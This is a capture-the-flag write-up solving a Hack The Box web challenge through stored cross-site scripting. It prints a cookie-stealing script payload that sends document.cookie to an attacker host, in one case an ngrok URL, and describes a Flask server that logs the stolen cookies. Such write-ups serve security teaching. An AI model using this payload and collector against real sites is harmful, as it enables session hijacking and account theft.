# Toy Workshop (300)

## Challenge

> The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?

* [web_toy_workshop.zip](web_toy_workshop.zip)

## Solution

1. Let's start by looking at the `challenge/index.js` file in the source code zip. The application connects to a sqlite database (`const db = new Database('toy_workshop.db');`), so lets look at `database.js`.

2. `database.js` allows for adding and reading items from the database. While we do control the `query` variable via the website, it does not look like we would be able to accomplish anything using an SQL injection.

3. Let's look at the `challenge/routes/index.js` file. There is an `/api/submit` endpoint which the frontend posts user data to. This function adds our user input, called a query, to the database and then calls `bot.readQueries(db)`. The `/queries` endpoint simply returns all the queries contained in the database. We cannot access the `/queries` endpoint because the IP address must be `127.0.0.1`, which is the localhost loopback address, otherwise the page redirects to `/`.

4. Next, let's check out `challenge/bot.js` so we can figure out what `bot.readQueries(db)` does. `bot.js` imports puppeteer, a headless Chromium browser controlled via JavaScript, defines a `flag` variable that holds the flag, loads the index page of the application, sets the `flag` cookie in the browser, visits the `/queries` endpoint, and then exits.

5. This is a stored cross-site scripting vulnerability (Stored XSS). We can send a malicious script through the frontend to the database. When a user visits the `/queries` page, the server will serve the malicious code to the user. We can craft our malicious code to grab the current cookies and then redirect to a webpage we control with those cookies as parameters in the request.

6. The malicious code is standard XSS code: `<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>`. We redirect to our webpage by changing the `document.location` and we set the `c` argument to `document.cookie`, which contains the current page's cookies.

7. However, we need to actually run a server to receive this request and log the cookie. There is a basic [Flask](https://flask.palletsprojects.com), a micro web framework written in Python, application that does exactly this in [xss-cookie-stealer.py](xss-cookie-stealer.py). The script defines one route, `/`, that will read the `c` parameter in the request URL, open a file called `cookies.txt`, write the contents of the `c` parameter to that file, and then redirect to `https://google.com`. We run this server on all interfaces (`0.0.0.0`) on port `16361`.

8. You can run this script anywhere that is internet accessible. For instance you can port forward port `16361` through your router or you could deploy a machine on Google Cloud. But, the easiest method is to use [ngrok](https://ngrok.com/).

9. Create an account at <https://ngrok.com/>, download the application, and get logged in. Now, start the Flask python server with `python xss-cookie-stealer.py` and then run `/ngrok http 16361`. Ngrok will display a URL in the form `http://<subdomain>.ngrok.io`.

10. Paste your ngrok URL into the malicious payload. If ngrok said my URL was `http://92832de0.ngrok.io`, then the payload should be `<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>`

11. Finally, paste the payload into the frontend for the application, wait a few second for the puppeteer instance to start and load the page, and then you should see the flag in your terminal running Flask and in the `cookies.txt` file.

### Flag

`HTB{3v1l_3lv3s_4r3_r1s1ng_up!}`
